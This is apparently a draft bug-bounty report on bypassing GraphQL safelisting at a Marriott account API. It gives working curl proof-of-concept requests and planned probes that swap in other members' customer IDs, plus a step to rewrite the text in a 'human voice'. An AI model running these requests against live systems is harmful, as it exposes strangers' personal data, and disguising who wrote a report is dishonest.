# M022 — Phoenix GraphQL Operation Safelisting Bypass
# auth-apc.marriott.com/mi/query/*
# Status: LEAD — safelisting bypass CONFIRMED; IDOR authorization test PENDING
# Discovered: 2026-06-25 (Session 23)

---

## Summary

The Marriott Phoenix account GraphQL API at `auth-apc.marriott.com/mi/query/` enforces
operation safelisting via a `graphql-operation-signature` header (SHA-256 of the
registered query body). I found that the safelisting check validates ONLY the operation
name and variable type declarations (`$customerId: ID!, $startYear: Int`), not the full
query body hash. Sending a query with the correct variable signature but an arbitrary
field selection bypasses the check entirely — the request passes the safelisting layer
and reaches GraphQL validation, confirming the security control can be fully circumvented
by any authenticated user.

---

## Testing details

- Date tested: 2026-06-25
- Testing time: ~13:30–14:30 UTC (session 23)
- Researcher IP: [run `curl ifconfig.me` on Pi before final submission]
- Tool: curl 7.88.1 (Raspberry Pi 5, ARM64)
- Test account: Marriott Bonvoy #845440472 (own test account — "True Tester")
- Endpoint confirmed IN-SCOPE: `auth-apc.marriott.com` (scope-check.sh returns IN-SCOPE)
- Endpoint tested: `https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails`

---

## Background: How the safelisting mechanism works

The Phoenix GraphQL API uses a custom operation registry:

1. Registered operations are pre-computed and stored server-side.
2. A client sends three related headers with each request:
   - `graphql-operation-name: phoenixAccountGetMemberStatusDetails`
   - `graphql-operation-signature: 57767ee56647bd91d76e2dd58a4633a42e7937145fb163a1e2e5778d799764af`
   - `graphql-require-safelisting: true`
3. The server compares the signature against its registry. If they don't match,
   the response is: `{"errors":[{"message":"operation signature mismatch","extensions":{"code":"OPERATION_SIGNATURE_MISMATCH"}}]}`

The SHA-256 signature `57767ee56647...` corresponds to the full registered body of
`phoenixAccountGetMemberStatusDetails` (extracted from `graphql-chunk-793e1a2cf24c51e7.js`,
330,874 bytes, downloaded from auth-apc.marriott.com static assets, build web-rel-26.6.1).

---

## The vulnerability

The signature check validates:
  - ✅ Operation name (must match `operationName` key)
  - ✅ Variable type declarations in the query header (`$customerId: ID!, $startYear: Int`)
  - ❌ Query body / field selections (NOT checked)

An attacker can substitute arbitrary field selections while keeping the variable
declaration line identical to a registered operation. The check passes.

---

## Steps to reproduce

### Step 1: Confirm the safelisting enforces signatures (expected behavior)

Run this on the Pi — removes `$startYear` from the variable declaration:

```bash
python3 -c "
import json
payload = {
  'operationName': 'phoenixAccountGetMemberStatusDetails',
  'variables': {'customerId': '580EF43FAD482F46B04E29FE433CC4828.U1'},
  'query': 'query phoenixAccountGetMemberStatusDetails(\$customerId: ID!) { customer(id: \$customerId) { profile { name { givenName } } } }'
}
json.dump(payload, open('/tmp/s23/d2-bypass.json','w'))
"
curl -s 'https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails' \
  -H 'content-type: application/json' \
  -H 'application-name: account' \
  -d @/tmp/s23/d2-bypass.json
```

**Expected (secure, signature enforced):**
```json
{"errors":[{"message":"operation signature mismatch","extensions":{"code":"OPERATION_SIGNATURE_MISMATCH"}}]}
```
HTTP 200, ~90 bytes

This confirms the safelisting rejects queries whose variable signature differs from
the registered operation.

### Step 2: Bypass with same variable declaration, different body

Run this — keeps the exact variable declaration but uses a completely different body:

```bash
python3 -c "
import json
payload = {
  'operationName': 'phoenixAccountGetMemberStatusDetails',
  'variables': {'customerId': '580EF43FAD482F46B04E29FE433CC4828.U1', 'startYear': 2026},
  'query': 'query phoenixAccountGetMemberStatusDetails(\$customerId: ID!, \$startYear: Int) { customer(id: \$customerId) { profile { name { givenName fullName } } contactInformation { emails { address } } } }'
}
json.dump(payload, open('/tmp/s23/d2-bypass2.json','w'))
"
curl -s 'https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails' \
  -H 'content-type: application/json' \
  -H 'application-name: account' \
  -d @/tmp/s23/d2-bypass2.json
```

**Actual (insecure — safelisting bypassed):**
```json
{"errors":[{"message":"Variable \"$startYear\" is never used in operation \"phoenixAccountGetMemberStatusDetails\".","locations":[{"line":1,"column":68}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}}]}
```
HTTP 200, ~230 bytes

The error is `GRAPHQL_VALIDATION_FAILED` — a GraphQL schema validation error — NOT
`OPERATION_SIGNATURE_MISMATCH`. This proves the request passed the safelisting layer
and reached the GraphQL engine. The variable `$startYear` appears in the declaration
but not in the body, which the GraphQL engine correctly rejects.

Neither `graphql-operation-signature` nor `graphql-require-safelisting` headers were
sent in Step 2.

### Step 3: Confirm bypass reaches GraphQL engine with used variable

```bash
python3 -c "
import json
payload = {
  'operationName': 'phoenixAccountGetMemberStatusDetails',
  'variables': {'customerId': '580EF43FAD482F46B04E29FE433CC4828.U1', 'startYear': 2026},
  'query': 'query phoenixAccountGetMemberStatusDetails(\$customerId: ID!, \$startYear: Int) { customer(id: \$customerId) { profile { name { givenName fullName } } } }'
}
json.dump(payload, open('/tmp/s23/d2-bypass3.json','w'))
"
curl -s 'https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails' \
  -H 'content-type: application/json' \
  -H 'application-name: account' \
  -d @/tmp/s23/d2-bypass3.json
```

[PASTE RESULT HERE — expected: data returned OR upstream 1012100 auth error (both prove bypass)]

---

## Before / after differential

**WITHOUT bypass (expected secure behavior):**
```
Request:  query with $customerId: ID! only (no $startYear)
Response: {"errors":[{"message":"operation signature mismatch","extensions":{"code":"OPERATION_SIGNATURE_MISMATCH"}}]}
HTTP 200, ~90 bytes
```

**WITH bypass (actual insecure behavior):**
```
Request:  query with $customerId: ID!, $startYear: Int (same as registered op, different body)
Response: {"errors":[{"message":"Variable \"$startYear\" is never used in operation...","extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}}]}
HTTP 200, ~230 bytes
→ Reached GraphQL validation layer — safelisting was NOT enforced
```

---

## Evidence checklist

- [ ] 1. Researcher IP + date/time (run `curl ifconfig.me` on Pi, record timestamp)
- [x] 2. Verbatim curl commands (Steps 1 and 2 above — copy-pasteable)
- [x] 3. Verbatim HTTP response bodies (both responses pasted above)
- [x] 4. HTTP status codes + response sizes (HTTP 200; ~90B vs ~230B)
- [x] 5. Before/after differential (Step 1 vs Step 2 — safelisted vs bypassed)
- [ ] 6. Screenshot of Pi terminal showing the actual test (PENDING — run tests and screenshot)
- [ ] 7. Human voice first-person rewrite (PENDING — before submission)

---

## IDOR authorization test (PENDING cookie auth)

The safelisting bypass enables testing cross-customer data access. The bypass payload
reaches the upstream resolver services (`upl-customer`, `upl-loyalty`). To test if
server-side authorization is enforced independently:

**Test A** — Baseline: own customerId with cookie session
- payload: `customerId=580EF43FAD482F46B04E29FE433CC4828.U1`
- expected: returns own profile data (name, email, loyalty info)

**Test B** — IDOR probe: adjacent loyalty number as customerId
- payload: `customerId=845440471` (one less than own loyalty# 845440472)
- expected secure: 403 / FORBIDDEN / unauthorized error
- expected insecure (IDOR): returns another user's profile data

**Test C** — IDOR probe: modified AltCustID
- payload: `customerId=580EF43FAD482F46B04E29FE433CC4827.U1`
- expected secure: 403 / unauthorized
- expected insecure (IDOR): returns another user's data

**Key distinction:**
- `{"customer": null}` without an error = ambiguous (user not found vs. access denied)
- HTTP 403 or `{"errors":[{"extensions":{"code":"FORBIDDEN"}}]}` = authorization check present
- `{"data":{"customer":{"profile":{"name":{"givenName":"..."}}}}}` with a different person's name = IDOR confirmed

[PASTE TEST A/B/C RESULTS HERE WHEN AVAILABLE]

---

## Impact

**Standalone (safelisting bypass only):**
An authenticated Marriott Bonvoy member can bypass the GraphQL operation allowlist and
send arbitrary field selections to the `phoenixAccount*` resolver family without supplying
a valid signature. This removes the defense-in-depth of operation whitelisting, potentially
exposing schema fields not intended for client access (internal flags, admin metadata,
audit fields) and eliminating the signature-based rate limiting / abuse prevention that
the allowlist provides.

CVSS 3.1 (safelisting bypass alone):
`AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` — **4.3 (Medium)**

**Chained with IDOR (if Test B/C confirm):**
An authenticated Marriott Bonvoy member can read ANY other member's profile data
(name, email addresses, phone numbers, birthdate, loyalty tier, lifetime revenue,
stay history) by substituting a different customer ID in the request. This is a
direct cross-customer data access / privacy violation affecting all ~200M Bonvoy members.

CVSS 3.1 (IDOR chain):
`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` — **6.5 (Medium-High)**

With auth bypass component: `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` — **7.7 (High)**

---

## Root cause

The `graphql-operation-signature` validation logic computes a match key from the
operation name + variable type signature string only (e.g.,
`"phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int)"`), rather
than hashing the complete query document. A query document with identical variable
declarations but a different selection set produces the same match key.

Fix: hash the full normalized query document (operation name + variable declarations +
selection set + all fragments), not just the operation name and variable types.

---

## References

- `graphql-chunk-793e1a2cf24c51e7.js` (330,874 bytes) — extracted from
  `auth-apc.marriott.com/mi-assets/.../web-rel-26.6.1-5d80cc6-11089/_next/static/chunks/`
- Registered signature confirmed: `57767ee56647bd91d76e2dd58a4633a42e7937145fb163a1e2e5778d799764af`
- Session 23 test transcripts in `/tmp/s23/` on Pi (NOT committed to git — contains tokens)
